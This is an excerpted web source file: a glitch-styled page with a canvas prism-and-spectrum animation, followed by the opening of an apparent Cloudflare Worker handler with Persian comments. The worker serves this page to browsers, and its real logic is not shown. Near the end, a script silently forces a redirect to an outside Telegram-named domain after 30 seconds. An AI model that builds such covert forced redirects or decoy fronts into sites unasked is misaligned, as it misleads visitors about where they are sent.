  ...
  <style>
    * {
    ...
    .vignette {
      ...
      z-index: 1;
      background:
        radial-gradient(ellipse 120% 90% at 50% 42%, transparent 55%, rgba(2, 3, 6, 0.55) 100%),
    ...
    /* ====== GLITCH TITLE – fixed white + RGB layers ====== */
    .title {
      position: fixed;
      bottom: 5%;
      left: 0;
    ...
    .glitch-text {
      ...
      font-weight: 600;
      /* white layer is the base, everything else is stacked on it */
    }

    /* all layers share the same positioning */
    .glitch-layer {
      position: absolute;
      top: 0;
      left: 0;
    ...
    /* white layer – sits on top, never moves */
    .glitch-white {
      position: relative;
      color: #fff;
      z-index: 10;
    ...
    /* colored layers – behind the white, occasionally shift */
    .glitch-cyan {
      color: rgba(0, 220, 255, 0.85);
      z-index: 7;
      animation: glitchCyan 7.3s infinite steps(1);
    }
    .glitch-magenta {
      color: rgba(255, 0, 100, 0.85);
      z-index: 8;
      animation: glitchMagenta 6.1s infinite steps(1);
    }
    .glitch-green {
      color: rgba(80, 255, 60, 0.85);
      z-index: 9;
      animation: glitchGreen 8.7s infinite steps(1);
    }

    /* ---- sparse, irregular glitch jumps ---- */
    ...
    /* very subtle additional randomness via text-shadow flicker on white */
    .glitch-white {
      animation: whiteFlicker 11s infinite steps(1);
    }
    @keyframes whiteFlicker {
      ...
      97.5% {
        text-shadow: 0 0 30px rgba(0, 220, 255, 0.2), 0 0 60px rgba(255, 0, 100, 0.1);
      }
      98% {
        text-shadow: 0 0 20px rgba(255, 255, 255, 0.08);
      }
      98.5% {
        text-shadow: 0 0 40px rgba(80, 255, 60, 0.15), 0 0 80px rgba(255, 0, 100, 0.05);
      }
      99% {
        text-shadow: 0 0 20px rgba(255, 255, 255, 0.08);
      }
...
<body>
  ...
  <script>
    (function() {
      ...
      // ================================================================
      //  OPTICAL BEAM + SPECTRUM (from original)
      // ================================================================
      ...
      function makeSheet(cols, rows, { opacity, headWhite, headK, alongBase, alongK, order = 6 }) {
        ...
        function specColor(w) {
          ...
          if (l < 440) { r = -(l - 440) / 60;
            g = 0;
            b = 1; } else if (l < 490) { r = 0;
            g = (l - 440) / 50;
            b = 1; } else if (l < 510) { r = 0;
            g = 1;
            b = -(l - 510) / 20; } else if (l < 580) { r = (l - 510) / 70;
            g = 1;
            b = 0; } else if (l < 645) { r = 1;
            g = -(l - 645) / 65;
            b = 0; } else { r = 1;
            g = 0;
            b = 0; }
          const f = l < 420 ? .45 + .55 * (l - 395) / 25 : l > 645 ? .5 + .5 * (700 - l) / 55 : 1;
          return [r * f, g * f, b * f];
        }
      ...
      function castRay(px, py, dx, dy, skip, out) {
        ...
        for (let i = 0; i < 3; i++) {
          ...
          if (t > 1e-4 && s >= -1e-4 && s <= 1.0001 && t < best) {
            ...
            const mx = (a.x + b.x) / 2,
              my = (a.y + b.y) / 2;
            if (nx * (mx - TRI_C.x) + ny * (my - TRI_C.y) < 0) { nx = -nx;
              ny = -ny; }
            bnx = nx;
            bny = ny;
          }
      ...
      function writeInnerColumn(rec, c, zOff) {
        ...
        for (let k = 0; k < rows; k++) {
          ...
          while (seg < cnt - 1 && acc + SEGL[seg] < target) { acc += SEGL[seg];
            seg++; }
      ...
      function buildIncoming(tA, hasEntry) {
        ...
        let x1, y1;
        if (hasEntry) { x1 = ENTRY.x;
          y1 = ENTRY.y; } else { x1 = 9 + 1;
          y1 = RAY.py + (x1 - RAY.px) * SLOPE; }
        for (let k = 0; k < INC_N; k++) {
          const u = k / (INC_N - 1);
          const x = x0 + (x1 - x0) * u;
          let y = y0 + (y1 - y0) * u;
          const envL = (u => { const t2 = u; return t2 * t2 * (3 - 2 * t2); })(Math.max(0, Math.min(1, (u - .02) / .16)));
          const envR = hasEntry ? (u => { const t2 = (x1 - x) / 3; return Math.max(0, Math.min(1, t2)) * Math.max(0, Math.min(1,
              t2)) * (3 - 2 * Math.max(0, Math.min(1, t2))); })(0) : (u => { const t2 = 1 - u; return Math.max(0, Math.min(1,
              (t2 - .02) / .16)) * Math.max(0, Math.min(1, (t2 - .02) / .16)) * (3 - 2 * Math.max(0, Math.min(1, (t2 - .02) /
              .16))); })(u);
      ...
      function castEntry() {
        ...
        const hit = castRay(sx, sy, RAY.dx, RAY.dy, -1, HIT_E) && HIT_E.nx * RAY.dx + HIT_E.ny * RAY.dy < -.001;
        ENTRY.valid = hit;
        if (hit) {
          ENTRY.x = HIT_E.x;
          ENTRY.y = HIT_E.y;
      ...
      function centerAngle() {
        ...
        if (CTRACE.valid) {
          ...
          for (const rec of TRACES) {
            if (rec.valid) { sum += Math.atan2(rec.dy, rec.dx);
              cnt++; }
          }
      ...
      function updateOptics(tA, dt, rotZ, bob) {
        ...
        const dIn = hasEntry ? Math.hypot(ENTRY.x - x0, ENTRY.y - (RAY.py + (x0 - RAY.px) * SLOPE)) : (viewX.right + 1 - x0) /
          RAY.dx;
        const airT = dIn / CV;
        ...
        for (let c = 0; c < NC; c++) {
          ...
          const glassRev = rec.len > 1e-6 ? Math.max(0, Math.min(1, sinceEntry * (CV / (1.17 + (c / (NC - 1)) * 0.113)) /
            rec.len)) : 0;
      ...
      // ---- AUTO REDIRECT after 30 seconds (forced) ----------------
      setTimeout(function() {
        try {
          window.location.replace("https://Telegramer.page.dev");
        } catch (_) {
          window.location.href = "https://Telegramer.page.dev";
        }
      }, 30000);
...
export default {
    async fetch(request, env, ctx) {
        ...
        // اگر مرورگر بود، صفحه HTML رو برگردون
        ...
        // ==========================================
        // شروع لاجیک مودیفای شده اختصاصی شما
        // ==========================================
